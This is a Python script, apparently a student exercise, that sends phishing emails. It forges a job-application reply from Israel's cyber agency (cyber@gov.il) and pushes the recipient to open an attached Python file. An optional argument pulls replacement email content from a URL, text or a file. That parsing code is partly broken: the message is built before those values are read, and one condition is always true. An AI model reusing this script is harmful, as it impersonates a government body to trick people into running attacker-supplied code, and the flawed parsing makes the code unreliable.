# Eden Reuveni 302313184
	
import sys			
import os			 
import validators		
from bs4 import BeautifulSoup	
import requests	
import smtplib
import urllib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders



if len(sys.argv)<4:
	print("Please enter 4 arguments: Phishing.py "' "user_name" '" "' "mail_service" '" "' "job_title" '"\n Or 5 arguments: Phishing.py "' "user_name" '" "' "mail_service" '" "' "job_title" '" and what elseeeeeeeee" )
	sys.exit()



username=sys.argv[1]
mailservice=sys.argv[2]
job_title=sys.argv[3]
email=username+'@'+mailservice
body=""
mes=body+f"\n Dear {username},\n Thanks for taking the time to apply for {job_title} position. \n We're happy to inform you that we would like to continue the process with you.\n To continue it- please open the attached file.\n Thank you again,\n The Cyber Agency Of Israel."
msg=MIMEMultipart()
msg['From']="cyber@gov.il"
msg['To']=email
msg['Subject']="Your job application"
msg.attach(MIMEText(mes,'plain'))

payload = MIMEBase('application', "octet-stream")
attach_file_name  = "attachment.py"
attach_file = open(attach_file_name, 'rb')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload) 
payload.add_header('Content-Disposition', 'attachment; filename="attachment.py"')
msg.attach(payload)

def send_mail():
	with smtplib.SMTP("localhost") as ls:
		ls.send_message(msg)

if len(sys.argv)==5:
	benignMail=sys.argv[4]
	benignMail=benignMail.replace('\\n', '\n')
	if validators.url(benignMail) == True :	
		r = requests.get(benignMail)
		soup = BeautifulSoup(r.content, 'html.parser')
		t=soup.title.string 
		n=soup.find('name')
		b=soup.find('body')
		c=soup.find('content')
		if t:
			job_title=t
		if n:
			email=n.text
		if b:
			body=b.text
		if c:
			body=c.text
		send_mail()
		
	elif "title" in benignMail or "Title" in benignMail:
		str=benignMail.split("\n")
		for line in str:
			if "name" in line :
				email=line.split(":")[1]
			elif "title" in line or "Title" in line:
				job_title=line.split(":")[1]
			elif "body" in line or "content" :
				body = line.split(":")[1]+"\n"
		send_mail()
	elif os.path.exists(benignMail):		
		with open(benignMail) as p:
			a=p.readlines()
		name = ""
		title = ""
		body = ""
		for line in a:
			if "name" in line :
				email=line.split(":")[1].strip()
			elif "title" in line or "Title" in line:
				job_title=line.split(":")[1].strip()
			elif "body" in line or "content" :
				body = line.split(":")[1].strip()+"\n" 
		send_mail()
	else:
		print ("not valid benignMail")
elif len(sys.argv)==4 :
	send_mail()